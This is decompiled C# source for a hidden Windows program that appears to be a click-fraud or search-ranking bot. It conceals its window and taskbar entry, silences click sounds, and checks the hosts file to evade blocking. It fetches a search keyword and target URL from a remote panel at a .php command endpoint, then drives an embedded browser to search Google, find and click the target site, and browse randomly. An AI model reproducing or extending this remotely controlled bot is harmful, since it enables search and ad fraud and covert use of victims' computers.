using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BrowserDene;

public class Form1 : Form
{
	private const int GWL_EXSTYLE = -20;

	private const int WS_EX_TOOLWINDOW = 128;

	public bool gezdimi;

	private string xxx;

	private KeyValuePair<string, string> _komut;

	private int _ieVersion;

	private IContainer components;

	private WebBrowser webBrowser1;

	[DllImport("user32.dll")]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int SetWindowLong(IntPtr window, int index, int value);

	[DllImport("user32.dll")]
	public static extern int GetWindowLong(IntPtr window, int index);

	[DllImport("winmm.dll")]
	public static extern int sndPlaySound(string lpszSoundName, int uFlags);

	public Form1()
	{
		Class2.fPYcDOPz3is7I();
		((Form)this)._002Ector();
		InitializeComponent();
	}

	public static void CheckHostsFile()
	{
		string text = File.ReadAllText(Environment.GetEnvironmentVariable("windir") + "\\system32\\drivers\\etc\\hosts");
		if (text.Contains("http://www.nurullahuzmez.com"))
		{
			Environment.Exit(1);
		}
	}

	private void SetText(string attribute, string attName, string value)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(attribute).Equals(attName))
			{
				val.SetAttribute("value", value);
			}
		}
	}

	private void ClickButton(string attribute, string attName)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("input");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute(attribute).Equals(attName))
			{
				val.RaiseEvent("onmouseover");
				val.RaiseEvent("onmousedown");
				val.InvokeMember("click");
			}
		}
	}

	private bool ClickLink(string url)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		bool result = false;
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			HtmlElement elementById = webBrowser1.get_Document().GetElementById("ires");
			HtmlElementCollection elementsByTagName = elementById.GetElementsByTagName("a");
			List<HtmlElement> list = new List<HtmlElement>();
			foreach (HtmlElement item in elementsByTagName)
			{
				HtmlElement val = item;
				string attribute = val.GetAttribute("href");
				if (!attribute.Contains("//webcache.googleusercontent.com") && !attribute.Contains("&amp;q=related:"))
				{
					list.Add(val);
				}
			}
			{
				foreach (HtmlElement item2 in list)
				{
					string attribute2 = item2.GetAttribute("href");
					if (attribute2.Contains(url))
					{
						item2.RaiseEvent("onmouseover");
						item2.RaiseEvent("onmousedown");
						item2.InvokeMember("click");
						return true;
					}
				}
				return result;
			}
		}
		return result;
	}

	public void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		string text = e.get_Url().ToString();
		Random random = new Random();
		if (text == "http://www.google.com.tr/" && _komut.Value != "" && xxx != "")
		{
			Timer val = new Timer();
			val.set_Interval(random.Next(1500, 3000));
			Timer val2 = val;
			val2.add_Tick((EventHandler)delegate(object sender, EventArgs e)
			{
				//IL_0021: Unknown result type (might be due to invalid IL or missing references)
				//IL_002c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0036: Expected O, but got Unknown
				ClickButton("name", "btnK");
				ClickButton("name", "btnG");
				((Timer)sender).Stop();
				((Component)(Timer)sender).Dispose();
			});
			SetText("name", "q", _komut.Key);
			val2.Start();
		}
		else if (text.StartsWith("http://www.google.com.tr/") && text.Contains("hl=tr"))
		{
			Timer val3 = new Timer();
			val3.set_Interval(random.Next(7000, 15000));
			Timer val4 = val3;
			val4.add_Tick((EventHandler)delegate(object sender, EventArgs e)
			{
				//IL_001a: Unknown result type (might be due to invalid IL or missing references)
				//IL_0025: Unknown result type (might be due to invalid IL or missing references)
				//IL_002f: Expected O, but got Unknown
				if (!ClickLink(_komut.Value))
				{
					Ilerle();
				}
				((Timer)sender).Stop();
				((Component)(Timer)sender).Dispose();
			});
			val4.Start();
		}
		else
		{
			if (!text.Contains(_komut.Value) || text.StartsWith("http://www.google.com"))
			{
				return;
			}
			Timer val5 = new Timer();
			val5.set_Interval(random.Next(60000, 120000));
			Timer val6 = val5;
			val6.add_Tick((EventHandler)delegate(object sender, EventArgs e)
			{
				//IL_0016: Unknown result type (might be due to invalid IL or missing references)
				//IL_0021: Unknown result type (might be due to invalid IL or missing references)
				//IL_002b: Expected O, but got Unknown
				if (!gezdimi)
				{
					RastGeleGez();
					gezdimi = true;
				}
				((Timer)sender).Stop();
				((Component)(Timer)sender).Dispose();
			});
			val6.Start();
		}
	}

	private void RastGeleGez()
	{
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		List<HtmlElement> list = new List<HtmlElement>(elementsByTagName.get_Count());
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.GetAttribute("target") != "_blank" && !string.IsNullOrEmpty(val.get_InnerText()))
			{
				list.Add(val);
			}
		}
		Random random = new Random();
		list[random.Next(list.Count - 1)].InvokeMember("click");
		list.Clear();
		Timer val2 = new Timer();
		val2.set_Interval(5000);
		Timer val3 = val2;
		val3.add_Tick((EventHandler)delegate
		{
			Environment.Exit(-1);
		});
		val3.Start();
	}

	private void Ilerle()
	{
		switch (_ieVersion)
		{
		case 6:
			Ilerle6();
			break;
		case 7:
			Ilerle7();
			break;
		case 8:
			Ilerle8();
			break;
		case 9:
			Ilerle9();
			break;
		}
	}

	private void Ilerle9()
	{
		if (webBrowser1.get_Document() != (HtmlDocument)null)
		{
			webBrowser1.get_Document().GetElementById("pnnext").InvokeMember("click");
		}
	}

	private void Ilerle8()
	{
		Ilerle6();
	}

	private void Ilerle7()
	{
		Ilerle6();
	}

	private void Ilerle6()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		if (!(webBrowser1.get_Document() != (HtmlDocument)null))
		{
			return;
		}
		HtmlElementCollection elementsByTagName = webBrowser1.get_Document().GetElementsByTagName("a");
		foreach (HtmlElement item in elementsByTagName)
		{
			HtmlElement val = item;
			if (val.get_OuterHtml().Contains("<B>Sonraki</B>"))
			{
				val.InvokeMember("click");
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		DefineExplorerVersion();
		Utils.DisableClickSounds();
		int windowLong = GetWindowLong(((Control)this).get_Handle(), -20);
		SetWindowLong(((Control)this).get_Handle(), -20, windowLong | 0x80);
		basla();
	}

	private void DefineExplorerVersion()
	{
		string text = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Internet Explorer")!.GetValue("Version")!.ToString();
		_ieVersion = int.Parse(text.Substring(0, 1));
	}

	private string FindPanel(string anaurl)
	{
		string result = "";
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using WebClient webClient2 = webClient;
		try
		{
			string input = webClient2.DownloadString(anaurl);
			Regex regex = new Regex("1(.*?)2", RegexOptions.IgnoreCase | RegexOptions.Compiled);
			Match match = regex.Match(input);
			result = match.Groups[1].ToString();
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private void KomutAl()
	{
		WebHeaderCollection webHeaderCollection = new WebHeaderCollection();
		webHeaderCollection.Add("User-Agent", "Mozilla/4.0 (compatiple; MSIE 6.0; Windows NT 5.1)");
		WebHeaderCollection headers = webHeaderCollection;
		WebClient webClient = new WebClient();
		webClient.Encoding = Encoding.Default;
		webClient.Headers = headers;
		using WebClient webClient2 = webClient;
		try
		{
			string text = webClient2.DownloadString("http://" + xxx + "/vrb/vrb.php");
			string[] array = text.Split(new char[1] { '|' });
			KeyValuePair<string, string> komut = new KeyValuePair<string, string>(array[0], array[1]);
			gezdimi = false;
			_komut = komut;
		}
		catch (Exception)
		{
		}
	}

	private void basla()
	{
		xxx = FindPanel("http://www.nurullahuzmez.com");
		KomutAl();
		webBrowser1.Navigate("http://www.google.com.tr");
	}

	private void webBrowser1_NewWindow(object sender, CancelEventArgs e)
	{
		e.Cancel = true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		webBrowser1 = new WebBrowser();
		((Control)this).SuspendLayout();
		((Control)webBrowser1).set_Dock((DockStyle)5);
		((Control)webBrowser1).set_Location(new Point(0, 0));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		webBrowser1.set_ScriptErrorsSuppressed(true);
		((Control)webBrowser1).set_Size(new Size(863, 351));
		((Control)webBrowser1).set_TabIndex(0);
		webBrowser1.set_WebBrowserShortcutsEnabled(false);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted));
		webBrowser1.add_NewWindow((CancelEventHandler)webBrowser1_NewWindow);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(863, 351));
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
